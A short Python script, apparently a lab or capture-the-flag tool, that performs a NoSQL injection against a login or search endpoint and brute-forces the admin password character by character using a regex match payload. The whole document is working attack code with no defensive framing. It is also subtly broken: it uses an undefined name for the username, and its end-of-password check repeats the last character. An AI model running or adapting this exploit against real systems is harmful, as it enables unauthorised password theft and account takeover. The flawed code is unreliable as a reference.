# importing the requests library
import requests
from time import sleep

# NoSQL db filter exploit for bruteforcing user's password
  
# send request to url with params
URL = ""
username = admin
params = username+"'+%26%26+this.password.match(/^{attempt}{end}/)%00"
find_on_page = 'search='+username
alphabet='1234567890abcdef-'
timeout = 0.1

try:
    passw = ""
    while True:
        # Iterate over alphabet
        for x in alphabet:
            # Get token letter by letter
            res = requests.get(url = URL, params = params.format(attempt=passw+x, end=".*"))
            # Print currently checked letter. Carriage return in order to clear line (visible effect)
            print(passw+x, end='\r')
            # If response containst expected (successful) test
            if res.text.find(find_on_page) > 0:
                # Add to token and issue another request to check whether it is the last letter in token
                passw += x
                res2 = requests.get(url = URL, params = params.format(attempt=passw+x, end="$"))

                if res2.text.find(find_on_page) > 0:
                    exit()
                continue
            sleep(timeout)
except KeyboardInterrupt:
    print("\n[!] Interrupted. Exiting now.")

  
